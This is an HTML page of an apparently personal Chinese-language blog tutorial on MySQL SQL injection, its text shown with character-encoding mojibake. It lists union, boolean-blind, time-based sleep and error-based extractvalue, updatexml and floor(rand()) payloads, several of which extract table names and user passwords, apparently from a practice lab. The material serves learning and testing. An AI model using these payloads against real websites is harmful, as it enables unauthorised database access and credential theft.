<!DOCTYPE html>
<html lang="zh-CN">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta charset="utf-8">

  
  <title>SQLæ³¨å…¥</title>
  
  <link rel="canonical" href="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/">
  
  <meta name="description" content="æ•°æ®åº“ç»“æ„Accessï¼š  è¡¨å åˆ—å æ•°æ®      mysqlã€mssqlã€Oracleã€MongoDBï¼š  æ•°æ®åº“å è¡¨å åˆ—å æ•°æ®        MYSQLæ³¨å…¥æŸ¥è¯¢æ–¹å¼selectæŸ¥è¯¢è¯­å¥åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ“ä½œã€‚ æŸ¥åº“ï¼š SELECT schema_name FROM infor">
  
  
  <meta name="author" content="Ja1e">
  
  
  
  <meta property="og:site_name" content="Ja1e" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="SQLæ³¨å…¥" />
  
  <meta property="og:description" content="æ•°æ®åº“ç»“æ„Accessï¼š  è¡¨å åˆ—å æ•°æ®      mysqlã€mssqlã€Oracleã€MongoDBï¼š  æ•°æ®åº“å è¡¨å åˆ—å æ•°æ®        MYSQLæ³¨å…¥æŸ¥è¯¢æ–¹å¼selectæŸ¥è¯¢è¯­å¥åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ“ä½œã€‚ æŸ¥åº“ï¼š SELECT schema_name FROM infor">
  
  <meta property="og:url" content="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="SQLæ³¨å…¥">
  
  <meta name="twitter:description" content="æ•°æ®åº“ç»“æ„Accessï¼š  è¡¨å åˆ—å æ•°æ®      mysqlã€mssqlã€Oracleã€MongoDBï¼š  æ•°æ®åº“å è¡¨å åˆ—å æ•°æ®        MYSQLæ³¨å…¥æŸ¥è¯¢æ–¹å¼selectæŸ¥è¯¢è¯­å¥åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ“ä½œã€‚ æŸ¥åº“ï¼š SELECT schema_name FROM infor">
  
  
  
  
  <meta name="twitter:url" content="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/" />

  <!-- Mobile Specific Metas
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  

  
  <script src="/js/pic.min.js" defer></script>
  

  

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">ğŸŒ‘</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>â˜€ï¸</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/About" class="ml">About</a>
          
        
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>
<link rel="stylesheet" href="/js/prism/prism.css">
        <div class="trans">
            <h2>SQLæ³¨å…¥</h2>

  <h1 id="æ•°æ®åº“ç»“æ„"><a href="#æ•°æ®åº“ç»“æ„" class="headerlink" title="æ•°æ®åº“ç»“æ„"></a>æ•°æ®åº“ç»“æ„</h1><p>Accessï¼š</p>
<ul>
<li>è¡¨å<ul>
<li>åˆ—å<ul>
<li>æ•°æ®</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>mysqlã€mssqlã€Oracleã€MongoDBï¼š</p>
<ul>
<li>æ•°æ®åº“å<ul>
<li>è¡¨å<ul>
<li>åˆ—å<ul>
<li>æ•°æ®</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="MYSQLæ³¨å…¥"><a href="#MYSQLæ³¨å…¥" class="headerlink" title="MYSQLæ³¨å…¥"></a>MYSQLæ³¨å…¥</h1><h2 id="æŸ¥è¯¢æ–¹å¼"><a href="#æŸ¥è¯¢æ–¹å¼" class="headerlink" title="æŸ¥è¯¢æ–¹å¼"></a>æŸ¥è¯¢æ–¹å¼</h2><h3 id="selectæŸ¥è¯¢è¯­å¥"><a href="#selectæŸ¥è¯¢è¯­å¥" class="headerlink" title="selectæŸ¥è¯¢è¯­å¥"></a>selectæŸ¥è¯¢è¯­å¥</h3><p>åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢æ“ä½œã€‚</p>
<p><strong>æŸ¥åº“</strong>ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT schema_name FROM information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>æŸ¥è¡¨</strong>ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;&#39;security&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>æŸ¥åˆ—</strong>ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT column_name FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>æŸ¥å­—æ®µ</strong>ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT username FROM security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="insertæ’å…¥è¯­å¥"><a href="#insertæ’å…¥è¯­å¥" class="headerlink" title="insertæ’å…¥è¯­å¥"></a>insertæ’å…¥è¯­å¥</h3><p>åœ¨ç½‘ç«™åº”ç”¨ä¸­è¿›è¡Œç”¨æˆ·æ³¨å†Œæ·»åŠ ç­‰æ“ä½œã€‚</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">INSERT INTO news(id,url,name) VALUES(2,&#39;x&#39;,&#39;abc&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="deleteåˆ é™¤è¯­å¥"><a href="#deleteåˆ é™¤è¯­å¥" class="headerlink" title="deleteåˆ é™¤è¯­å¥"></a>deleteåˆ é™¤è¯­å¥</h3><p>åå°ç®¡ç†é‡Œé¢åˆ é™¤æ–‡ç« åˆ é™¤ç”¨æˆ·ç­‰æ“ä½œã€‚</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DELETE FROM news WHERE id&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="updateæ›´æ–°æ•°æ®"><a href="#updateæ›´æ–°æ•°æ®" class="headerlink" title="updateæ›´æ–°æ•°æ®"></a>updateæ›´æ–°æ•°æ®</h3><p>ä¼šå‘˜æˆ–åå°ä¸­å¿ƒæ•°æ®åŒæ­¥æˆ–ç¼“å­˜ç­‰æ“ä½œã€‚</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE user SET pwd&#x3D;123 WHERE id&#x3D;2 and username&#x3D;&#39;admin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="æœ‰å›æ˜¾æ³¨å…¥"><a href="#æœ‰å›æ˜¾æ³¨å…¥" class="headerlink" title="æœ‰å›æ˜¾æ³¨å…¥"></a>æœ‰å›æ˜¾æ³¨å…¥</h2><p><strong>è”åˆæŸ¥è¯¢</strong></p>
<p>æŸ¥åˆ—æ•°ï¼šorder by 4</p>
<p>è”åˆæŸ¥è¯¢ï¼šunion select 1,2,3,â€¦â€¦</p>
<p>åœ¨æœ‰å›æ˜¾çš„æ•°å­—æ›¿æ¢æˆæŸ¥è¯¢è¯­å¥å³å¯ã€‚</p>
<h2 id="æ— å›æ˜¾ç›²æ³¨"><a href="#æ— å›æ˜¾ç›²æ³¨" class="headerlink" title="æ— å›æ˜¾ç›²æ³¨"></a>æ— å›æ˜¾ç›²æ³¨</h2><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>regexpã€likeã€asciiã€leftã€ordã€mid</p>
<p>ä¸€èˆ¬é…åˆpyè„šæœ¬æ³¨å…¥ã€‚</p>
<p>çŒœ<strong>å½“å‰æ•°æ®åº“å</strong>ç¬¬ä¸€ä½å­—æ¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and left(database(),1)&#x3D;&#39;s&#39;--+ 
&#39;and substr(database(),1,1)&#x3D;&#39;s&#39;--+
&#39;and ascii(substr(database(),1,1))&#x3D;115--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>çŒœ<strong>ç¬¬å…­ä¸ªæ•°æ®åº“å</strong>çš„ç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select schema_name from information_schema.schemata limit 5,1),1,1))&#x3D;115--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åˆ¤æ–­securityåº“ä¸­çš„ç¬¬å››ä¸ªè¡¨çš„æ•°æ®çš„ç¬¬ä¸€ä½çš„asciiç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1))&gt;11--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åˆ¤æ–­è¡¨ä¸­<strong>å­—æ®µ</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select column_name from information_schema.columns where table_name &#x3D; &#39;security&#39; limit 1,1),1,1))&gt;10--+
&#39;and ascii(substr((select username from security.users limit 0,1),1,1))&gt;10--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>ifã€sleep</p>
<p>ä¸€èˆ¬é…åˆpyè„šæœ¬æ³¨å…¥ã€‚</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>?id&#x3D;1â€™ and if (ascii(substring(database(),1,1))&#x3D;67,sleep(5),1)â€“+</td>
<td>é€šè¿‡asciiç æ¥æ¯”è¾ƒ</td>
</tr>
<tr>
<td>?id&#x3D;1â€™ and if (hex(substring(database(),1,1))&#x3D;FF,sleep(5),1)â€“+</td>
<td>é€šè¿‡åå…­è¿›åˆ¶å€¼æ¥æ¯”è¾ƒ</td>
</tr>
<tr>
<td>?id&#x3D;1â€™ and if (mid(database(),1,1)&#x3D;â€™sâ€™,sleep(5),1)â€“+</td>
<td>ä½¿ç”¨midå‡½æ•°ä»£æ›¿substr</td>
</tr>
<tr>
<td>?id&#x3D;1â€™ and if (substr(database(),1,1)&#x3D;â€™sâ€™,sleep(5),1)â€“+</td>
<td></td>
</tr>
<tr>
<td>?id&#x3D;1â€™ and if (left(database(),2)&#x3D;â€™seâ€™,sleep(5),1)â€“+</td>
<td>æˆªå–å·¦è¾¹ä¸¤ä¸ªä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>?id&#x3D;1â€™ and if (right(database(),2)&#x3D;â€™tyâ€™,sleep(5),1)â€“+</td>
<td>æˆªå–å³è¾¹ä¸¤ä¸ªå­—ç¬¦</td>
</tr>
</tbody></table>
<p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ï¼šâ€™and sleep(5)â€“+</p>
<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>é¡µé¢æ— æ³•æ˜¾ç¤ºæ•°æ®åº“çš„ä¿¡æ¯ï¼Œä½†æ˜¯æºç ä¸­æœ‰mysqlè¾“å‡ºé”™è¯¯çš„å‡½æ•°æŠŠmysqlçš„é”™è¯¯å›æ˜¾åˆ°å‰ç«¯ï¼Œä¹Ÿå°±æ˜¯æœ‰æŠ¥é”™å†…å®¹çš„ã€‚<br>æŠ¥é”™æ³¨å…¥å½¢å¼ä¸Šä¸€èˆ¬æ˜¯åšä¸¤ä¸ªåµŒå¥—çš„æŸ¥è¯¢ï¼Œé‡Œé¢çš„é‚£ä¸ªæŸ¥è¯¢è¢«ç§°ä¸ºå­æŸ¥è¯¢ï¼Œæ‰§è¡Œé¡ºåºä¹Ÿæ˜¯ä»å­æŸ¥è¯¢å¼€å§‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å­æŸ¥è¯¢æŸ¥è¯¢æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œç„¶ååœ¨é€šè¿‡æŠ¥é”™å‡½æ•°å°†æˆ‘ä»¬æŸ¥è¯¢åˆ°çš„æ•°æ®å¸¦å‡ºï¼Œä»è€Œè¾¾åˆ°çˆ†å‡ºæƒ³è¦æŸ¥è¯¢çš„æ•°æ®ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">12ç§æŠ¥é”™æ³¨å…¥+ä¸‡èƒ½è¯­å¥ - ç®€ä¹¦ (jianshu.com)</a></p>
<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>mysqlç‰ˆæœ¬å·å¤§äº5.1.5</p>
<p>å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°ã€‚</p>
<p><code>EXTRACTVALUE(XML_document,XPath_string)</code>ï¼šä»<code>XML_document</code>ä¸­è¿”å›æ‰€åŒ…å«æŸ¥è¯¢å€¼çš„<code>XPath_string</code>ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°<code>XPath_String</code>æ˜¯æŠ¥é”™çš„å…³é”®ï¼ŒXMLæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨<code>/xxx/xxx/xxx</code>è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥éæ³•æ ¼å¼çš„å†…å®¹å°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”è¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p>
<p>paylaodï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">EXTRACTVALUE(&#39;anything&#39;,[æŸ¥è¯¢è¯­å¥])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½¿ç”¨<code>concat()</code>èƒ½ä½¿æŸ¥è¯¢è¯­å¥è¾“å‡ºçš„æ›´åŠ å®Œæ•´ã€‚</p>
<p><code>extractvalue()</code>æŠ¥é”™ä¸€æ¬¡åªèƒ½å›æ˜¾å‡º32ä½çš„æ•°æ®ï¼Œå¦‚æœæƒ³è¦å›æ˜¾è¶…è¿‡32ä½çš„æ•°æ®ï¼Œéœ€è¦ä½¿ç”¨<code>substr(), mid(), left(), right()</code>ä¹‹ç±»çš„æˆªæ–­å‡½æ•°å»æˆªæ–­æ•°æ®åˆ†æ¬¡è¾“å‡ºã€‚</p>
<p><strong>çˆ†æ•°æ®åº“å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†è¡¨å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†åˆ—å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†æ•°æ®</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(password) from users)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>mysqlç‰ˆæœ¬å·å¤§äº5.1.5</p>
<p>æ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°ã€‚</p>
<p><code>UPDATEXML(XML_document,XPath_string,new_value);</code></p>
<p><code>updatexml()</code>çš„æŠ¥é”™æ³¨å…¥å§¿åŠ¿å’Œ<code>extractvalue()</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç¬¬äºŒä¸ªå‚æ•°ä½ç½®ï¼Œè¾“å…¥éæ³•å­—ç¬¦ï¼Œå¯¼è‡´æŠ¥é”™ã€‚</p>
<p>updatexml()å’Œextractvalue()ç›¸åŒä¸€æ¬¡åªèƒ½è¾“å‡º<code>32</code>ä½æ•°æ®ï¼Œè¦å®Œæ•´çš„è¾“å‡ºæ•°æ®åªèƒ½ä½¿ç”¨æˆªæ–­å‡½æ•°è¿›è¡Œæˆªæ–­åˆ†å¤šæ¬¡è¾“å‡ºã€‚</p>
<p><strong>çˆ†æ•°æ®åº“å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select database())),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†è¡¨å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†åˆ—å</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;)),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†æ•°æ®</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(password)from users)),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">MysqlæŠ¥é”™æ³¨å…¥ä¹‹floor(rand(0)*2)æŠ¥é”™åŸç†æ¢ç©¶ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<blockquote>
<p>è¿™é‡Œéœ€è¦å…ˆäº†è§£å‡ ä¸ªå‡½æ•°ï¼š<br>rand()éšæœºå‡½æ•°ï¼Œè¿”å›0~1ä¹‹é—´çš„æŸä¸ªå€¼<br>floor(a)å–æ•´å‡½æ•°ï¼Œè¿”å›å°äºç­‰äºa,ä¸”å€¼æœ€æ¥è¿‘açš„ä¸€ä¸ªæ•´æ•°<br>count()èšåˆå‡½æ•°ä¹Ÿç§°ä½œè®¡æ•°å‡½æ•°ï¼Œè¿”å›æŸ¥è¯¢å¯¹è±¡çš„æ€»æ•°<br>group by x åˆ†ç»„è¯­å¥ï¼ŒæŒ‰ç…§æŸ¥è¯¢ç»“æœåˆ†ç»„</p>
</blockquote>
<p>æŠ¥é”™è¯­å¥ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select count(*) from users group by concat(database(),floor(rand(0)*2));
select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä¸¤å¥çš„å«ä¹‰æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œç¬¬äºŒå¥åªæ˜¯æŠŠ<code>concat(database(),floor(rand(0)*2))</code> å½“åšäº†<code>x</code>ã€‚</p>
<ul>
<li><code>floor(rand(0)*2))</code>ï¼šrand()å‡½æ•°æ¯æ¬¡äº§ç”Ÿçš„æ•°éƒ½ä¸åŒï¼Œä½†æ˜¯é€šè¿‡ä¸€ä¸ªå›ºå®šçš„éšæœºæ•°çš„ç§å­0ä¹‹åï¼Œrand(0)å¯ä»¥å½¢æˆå›ºå®šçš„ä¼ªéšæœºåºåˆ—ã€‚æ‰€ä»¥<code>floor(rand(0)*2)</code>å°±ä¼šäº§ç”Ÿå›ºå®šçš„æ•°åˆ—<code>011011</code>ã€‚</li>
<li><code>group_by</code>ï¼šé€šè¿‡group byè¿›è¡Œåˆ†ç»„æ’åºï¼Œç»“æœä¼šè¿›è¡Œåˆ†ç»„ï¼Œç›¸åŒåå­—ä¸ºåˆå¹¶ã€‚</li>
<li><code>count(*)</code>ï¼šè®¡æ•°ã€‚</li>
</ul>
<p>å¯¹äºè¯­å¥ï¼š</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select count(*) from users group by (floor(rand(0)*2));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°tipsï¼š<strong>åœ¨ä½¿ç”¨group byçš„æ—¶å€™ï¼Œfloor(rand(0)*2)ä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœè™šè¡¨ä¸å­˜åœ¨è®°å½•ï¼Œæ’å…¥è™šè¡¨çš„æ—¶å€™floor(rand(0)*2)ä¼šå†è¢«æ‰§è¡Œä¸€æ¬¡</strong></p>
<p>æ‰§è¡Œæµç¨‹ï¼š<code>floor(rand(0)*2))</code>ç¬¬ä¸€æ¬¡è®¡ç®—æ˜¯0ï¼Œè™šè¡¨æ²¡æœ‰ï¼Œäºæ˜¯æ’å…¥è™šè¡¨ï¼Œæ³¨æ„æ­¤æ—¶<code>floor(rand(0)*2))</code>åˆä¼šè®¡ç®—ä¸€æ¬¡(ç¬¬äºŒæ¬¡è®¡ç®—)ï¼Œç»“æœä¸º1ï¼Œæ‰€ä»¥æ’å…¥è™šè¡¨çš„å€¼æ˜¯1ï¼›ç„¶å<code>floor(rand(0)*2))</code>ç¬¬ä¸‰æ¬¡è®¡ç®—ç»“æœæ˜¯1ï¼Œè™šè¡¨é‡Œæœ‰ï¼Œäºæ˜¯<code>count</code>ç›´æ¥åŠ 1ï¼›<code>floor(rand(0)*2))</code>ç¬¬å››æ¬¡è®¡ç®—æ˜¯0ï¼Œè™šè¡¨æ²¡æœ‰ï¼Œäºæ˜¯æ’å…¥è™šè¡¨ï¼Œæ­¤æ—¶<code>floor(rand(0)*2))</code>ä¼šå†æ¬¡è®¡ç®—ï¼ˆç¬¬äº”æ¬¡è®¡ç®—ï¼‰ç„¶åæ’å…¥è™šè¡¨ï¼Œæ­¤æ—¶ç»“æœæ˜¯1ï¼Œä½†æ˜¯è™šè¡¨é‡Œå·²ç»æœ‰1äº†ï¼Œæ‰€ä»¥å¯¼è‡´äº†ä¸»é”®é‡å¤æŠ¥é”™ã€‚</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">æŠ¥é”™ä¿¡æ¯ï¼šERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>çˆ†æ•°æ®åº“åï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat(database(),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†è¡¨åï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†åˆ—åï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>çˆ†æ•°æ®ï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select password from security.users limit 0,1),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



